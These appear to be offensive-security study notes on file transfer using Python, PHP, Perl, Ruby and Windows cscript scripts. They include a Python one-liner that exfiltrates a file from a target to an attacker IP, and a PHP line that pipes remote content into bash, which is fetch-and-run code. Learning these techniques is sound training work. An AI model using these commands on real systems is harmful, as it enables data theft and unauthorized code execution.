# Transferring Files with Code

Programming languages like **Python, PHP, Perl, and Ruby** are common on Linux distributions and can occasionally be found on Windows. Windows also includes default applications like **cscript** and **mshta** that can execute JavaScript or VBScript to facilitate file transfers. Use these techniques when standard utilities like `wget` or `curl` are unavailable or restricted.

### Python File Transfers

**Python** is highly versatile for both downloading and uploading files. Version 3 is standard, but version 2.7 may still be encountered on older systems.

#### Download Workflow

Use Python one-liners with the `-c` flag to execute download logic directly from the command line.

|Version|Command Reference|
|:--|:--|
|**Python 2**|`python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<FILENAME>")'`|
|**Python 3**|`python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<FILENAME>")'`|

#### Upload Workflow

This method is used to exfiltrate data from a target to an attack machine.

1. **Start the listener** on the `<ATTACK_IP>` using the Python `uploadserver` module:
    
    ```
    python3 -m uploadserver
    ```
    
2. **Execute the upload** from the target machine using a Python 3 one-liner:
    
    ```
    python3 -c 'import requests;requests.post("http://<ATTACK_IP>:<PORT>/upload",files={"files":open("<PATH_TO_FILE>","rb")})'
    ```
    

---

### PHP File Transfers

**PHP** is used by a significant majority of web services, making it a reliable choice for offensive operations.

#### Download Methods

PHP can execute one-liners using the `-r` flag.

|Method|Command|Note|
|:--|:--|:--|
|**File_get_contents**|`php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILENAME>",$file);'`|Simple download and save.|
|**Fopen (Stream)**|`php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<FILENAME>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`|Opens a URL, reads content in chunks, and writes to a local file.|
|**Fileless Pipe**|`php -r '$lines = @file(""); foreach ($lines as $line_num => $line) { echo $line; }'|bash`|

#### Required Configurations

|Setting|Implication|
|:--|:--|
|**fopen wrappers**|Must be **enabled** for the `@file` function to treat a URL as a filename.|

---

### Perl & Ruby Downloads

These languages are common alternatives on Linux systems and support one-liners via the `-e` flag.

|Language|Command Reference|
|:--|:--|
|**Ruby**|`ruby -e 'require "net/http"; File.write("<FILENAME>", Net::HTTP.get(URI.parse("<URL>")))'`|
|**Perl**|`perl -e 'use LWP::Simple; getstore("<URL>", "<FILENAME>");'`|

---

### Windows Scripting Host (JavaScript & VBScript)

When targeting Windows, **cscript.exe** can be used to execute scripts that leverage ActiveX objects for file transfers.

#### JavaScript (wget.js)

1. **Create the script** `wget.js` with the following content:
    
    ```
    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    WinHttpReq.Open("GET", WScript.Arguments(0), false);
    WinHttpReq.Send();
    BinStream = new ActiveXObject("ADODB.Stream");
    BinStream.Type = 1;
    BinStream.Open();
    BinStream.Write(WinHttpReq.ResponseBody);
    BinStream.SaveToFile(WScript.Arguments(1));
    ```
    
2. **Execute** the download:
    
    ```
    cscript.exe /nologo wget.js <URL> <FILENAME>
    ```
    

#### VBScript (wget.vbs)

1. **Create the script** `wget.vbs` with the following content:
    
    ```
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", WScript.Arguments.Item(0), False
    xHttp.Send
    with bStrm
        .type = 1
        .open
        .write xHttp.responseBody
        .savetofile WScript.Arguments.Item(1), 2
    end with
    ```
    
2. **Execute** the download:
    
    ```
    cscript.exe /nologo wget.vbs <URL> <FILENAME>
    ```